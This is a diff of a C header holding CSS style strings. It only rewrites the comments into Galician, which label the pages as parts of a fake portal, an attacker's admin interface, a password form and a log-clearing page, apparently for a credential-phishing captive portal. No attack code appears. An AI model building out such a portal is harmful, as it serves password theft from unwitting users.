@@ -1,7 +1,7 @@
 #ifndef STYLES_H
 #define STYLES_H
 
-// Style for verification code page
+//Documentos css usados en distintos puntos do portal falso.
 const char* VERIFICATION_CODE_STYLE = R"=====(
   body {
     font-family: Arial, sans-serif;
@@ -64,7 +64,7 @@ const char* VERIFICATION_CODE_STYLE = R"=====(
   }
 )=====";
 
-// Style for admin panel
+//Documentos css para os estilos da interfaz de atacante
 const char* ADMIN_PANEL_STYLE = R"=====(
   body {
     font-family: Arial, sans-serif;
@@ -114,7 +114,7 @@ const char* ADMIN_PANEL_STYLE = R"=====(
   }
 )=====";
 
-// Style for password form
+//Estilos de formulario contrasinal
 const char* PASSWORD_FORM_STYLE = R"=====(
   body {
     font-family: Arial, sans-serif;
@@ -150,7 +150,7 @@ const char* PASSWORD_FORM_STYLE = R"=====(
   }
 )=====";
 
-// Style for toggle mode page
+//Estilos de paxina de boton de cambio de modo
 const char* TOGGLE_MODE_STYLE = R"=====(
   body {
     font-family: Arial, sans-serif;
@@ -180,7 +180,7 @@ const char* TOGGLE_MODE_STYLE = R"=====(
   }
 )=====";
 
-// Style for clear logs page
+//Estilos para a paxina de borrado de logs
 const char* CLEAR_LOGS_STYLE = R"=====(
   body {
     font-family: Arial, sans-serif;
@@ -210,7 +210,7 @@ const char* CLEAR_LOGS_STYLE = R"=====(
   }
 )=====";
 
-// Style for error page
+//Estilos para a paxina de error
 const char* ERROR_STYLE = R"=====(
   body {
     font-family: Arial, sans-serif;
